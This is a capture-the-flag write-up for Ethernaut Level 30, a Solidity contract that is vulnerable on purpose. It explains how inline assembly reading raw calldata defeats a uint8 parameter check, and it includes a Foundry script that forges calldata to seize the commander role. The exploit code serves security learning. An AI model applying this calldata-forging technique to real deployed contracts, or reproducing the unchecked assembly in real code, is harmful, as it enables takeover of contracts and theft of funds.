# Ethernaut Level 30 HigherOrder

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```

We have to become the commander to pass the game. We have to somehow put a number in treasury that is larger than 255 to claim leadership. It seems impossible, since `registerTreasury(uint8)` takes in only a `uint8`, whose maximum value is 255. However, we can forge a calldata for `registerTreasury(uint8)` to do the trick.

`sstore(slot, value)` stores a value in a 32 bytes slot. `calldataload(offset)` reads 32 bytes from the **input data** of the current call, starts at offset. So, we can put a number that is large enough and still fit in the 32 bytes slot to pass this game.

`IHigherOrder.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IHigherOrder {
    function claimLeadership() external;
    function commander() external view returns (address);
}
```

`HigherOrder.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {IHigherOrder} from "../src/IHigherOrder.sol";

contract HigherOrderScript is Script {
    address target = 0xXXXXXXXX;
    IHigherOrder higherOrder = IHigherOrder(target);
    bytes4 registerTreasurySelector = bytes4(keccak256("registerTreasury(uint8)"));

    function run() external {
        vm.startBroadcast();

        bytes memory registerTreasuryCalldata = abi.encodePacked(
            registerTreasurySelector,
            uint256(256)
        );

        (bool success, ) = target.call(registerTreasuryCalldata);
        require(success, "registerTreasury call failed");

        higherOrder.claimLeadership();
        vm.stopBroadcast();
        console.log("commander:", higherOrder.commander()); 
    }
}
```

Notice that we use a low-level call instead of using the ABI for calling function `registerTreasury` to avoid the `uint8` limitation. 